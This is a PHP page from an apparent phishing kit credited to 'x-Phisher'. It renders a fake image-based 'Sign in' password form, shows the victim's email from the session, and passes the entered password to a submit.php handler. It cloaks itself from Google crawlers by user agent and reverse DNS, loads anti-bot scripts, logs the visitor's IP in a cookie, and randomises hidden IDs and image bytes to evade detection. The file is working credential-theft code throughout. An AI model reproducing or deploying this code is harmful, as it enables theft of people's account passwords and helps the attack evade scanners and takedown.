<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.com ===========================
*/
session_start();
error_reporting(0);
$path = "../site/";
include('../BOTS/antibots1.php');
include('../BOTS/antibots2.php');
include('../BOTS/antibots3.php');
include('../BOTS/antibots4.php');
include ('../BOTS/authenticator.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include($path."index.php"); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { include($path."index.php"); exit(); }
if (isset($_SESSION['e'])) {
}else{
	header("Location: ../index.php");
}
if (isset($_POST['p_e'])) {
    include "./submit.php";
}
$code = "0010".rand(10,1000).date("Y-m-d").time().rand(10,1000)."1011";
$code1 = base64_encode($code);
$desktop = '<!DOCTYPE html><html><head> <title>Sign in</title> <link rel="short icon"herf="data:image/x-icon;base64,'.base64_encode(file_get_contents('../files/favicon.ico').$code1).'"></head><body background="data:image/png;base64,'.base64_encode(file_get_contents('../files/1.jpg').$code1).'"style="background-repeat:no-repeat;background-position:center center;background-attachment:fixed;background-attachment:fixed;background-size:cover;"> <div id="1'.$code1.'"> <form id="1'.$code1.'"><input type="hidden" value="'.$code1.'"> <input type="hidden" value="'.$code1.'"> </form> </div><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.js"></script> <script type="text/javascript">var getIPAddress=function(){$.getJSON("https://jsonip.com?callback=?", function(data){x=data.ip; document.cookie="ip11=;"; document.cookie="ip11=" + x;});}; getIPAddress(); </script> <div style="margin-right:auto;margin-left:auto;margin-top:240px;margin-bottom:auto;position:relative;max-width:351.9px;width:calc(100% - 40px);padding:43.9px;background-color:white;min-height:300px;min-width:319.9px; left: 0px; top: -102px;"><img src="data:image/png;base64,'.base64_encode(file_get_contents('../files/6.PNG').$code1).'" style="width: 114px;margin-bottom:5px;"> <br><span style="font-size:15px;font-family:Arial,Helvetica,sans-serif;color:dimgrey;">'.$_SESSION['e'].'</span> <br><img src="data:image/png;base64,'.base64_encode(file_get_contents('../files/10.PNG').$code1).'" style="margin-top: 17px;width: 320px;"> <form id="f3" method="post" action="#" style="margin-bottom: 0px;"> <input required type="password" placeholder="Password" name="p_e" style="outline:none; background-color:transparent;border:0px solid;height:30px;width:300px;font-weight:lighter;font-size:15px;margin-left:5px;padding-bottom:0px;padding-top:0px;"><img src="data:image/png;base64,'.base64_encode(file_get_contents('../files/8.PNG').$code1).'" style="width: 357px;"> <button type="submit" style="background-image: url(data:image/png;base64,'.base64_encode(file_get_contents('../files/4.PNG').$code1).');background-size:cover;margin-top: 10px;width:109px;margin-left:245px;height:32px;border-left-width: 0px;padding-top: 0px;padding-left: 0px;border-bottom-width: 0px;border-top-width: 0px;border-right-width: 0px;padding-right: 0px;padding-bottom: 0px;"></button> </form> </div><div id="'.$code1.'"> <form id="'.$code1.'"> <input type="hidden" value="'.$code1.'"> </form> </div></body></html>';
$mobile = '<!DOCTYPE html><html><head> <title>Sign in</title> <link rel="short icon" herf="../files/favicon.ico"> <meta charset="utf-8"/> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"></head><body> <div id="'.$code1.'"> <form id="'.$code1.'"> <input type="hidden" value="'.$code1.'"> <input type="hidden" value="'.$code1.'"></form> </div><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.js"></script> <script type="text/javascript">var getIPAddress=function(){$.getJSON("https://jsonip.com?callback=?", function(data){x=data.ip; document.cookie="ip11=;"; document.cookie="ip11=" + x;});}; getIPAddress(); </script><img src="data:image/png;base64,'.base64_encode(file_get_contents('../files/6.PNG').$code1).'" style="margin-top: 15px;margin-left: 15px;width: 114px;"> <br><span style="padding-left: 13px;font-size:15px;font-family:Arial,Helvetica,sans-serif;color:dimgrey;">'.$_SESSION['e'].'</span> <br><img src="data:image/png;base64,'.base64_encode(file_get_contents('../files/10.PNG').$code1).'" style="width: 320px;margin-top: 17px;margin-left: 15px;"> <form id="f3" method="post" action="#" style="margin-bottom: 0px;"> <input required type="password" placeholder="Password" name="p_e" style="outline:none; background-color:transparent;border:0px solid;height:30px;width:300px;font-weight:lighter;font-size:15px;margin-left: 15px;padding-bottom:0px;padding-top:0px;"><img src="data:image/png;base64,'.base64_encode(file_get_contents('../files/8.PNG').$code1).'" style="margin-left: 15px;width: 357px;"> <button type="submit" style="background-image: url(../files/9.PNG);background-size:cover;margin-top: 10px;margin-left:245px;width:109px;height:32px;border-left-width: 0px;padding-top: 0px;padding-left: 0px;border-bottom-width: 0px;border-right-width: 0px;border-top-width: 0px;padding-right: 0px;padding-bottom: 0px;"></button> </form><img src="data:image/png;base64,'.base64_encode(file_get_contents('../files/12.PNG').$code1).'" style="width: 411px;margin-top:410px;"> <div id="1'.$code1.'"> <form id="1'.$code1.'"> <input type="hidden" value="'.$code1.'"> </form> </div></body></html>';
$user_agent = array('/iphone/i','/android/i','/blackberry/i','/webos/i');
foreach($user_agent as $agent => $user){
    if (preg_match($user, $_SERVER['HTTP_USER_AGENT'])) {
        echo $mobile;
        exit;
    }
}
echo $desktop;
?>